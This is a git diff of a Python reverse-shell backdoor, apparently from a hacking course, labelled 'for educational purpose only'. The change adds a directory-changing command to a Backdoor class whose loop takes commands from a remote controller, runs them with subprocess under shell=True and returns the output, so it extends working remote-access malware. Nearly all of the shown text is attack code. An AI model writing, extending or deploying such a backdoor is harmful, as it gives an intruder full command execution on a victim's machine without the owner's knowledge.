@@ -5,7 +5,7 @@ Author：Seldon Pang
 Establish a reverse connection from the target machine
 Please use for educational purpose only...
 """
-
+import os
 import socket
 # https://docs.python.org/2/library/socket.html
 import subprocess
@@ -34,6 +34,10 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def change_working_directory_to(self, path):
+        os.chdir(path)
+        return "[+] Changing working directory to " + path
+
     def run(self):
         while True:
             received_command = self.reliable_receive()
@@ -41,8 +45,11 @@ class Backdoor:
             if received_command[0] == "exit":
                 self.connection.close()
                 exit()
+            elif received_command[0] == "cd" and len(received_command) > 1:
+                command_result = self.change_working_directory_to(received_command[1])
+            else:
+                command_result = self.execute_system_command(received_command)
 
-            command_result = self.execute_system_command(received_command)
             self.reliable_send(command_result)
 
 
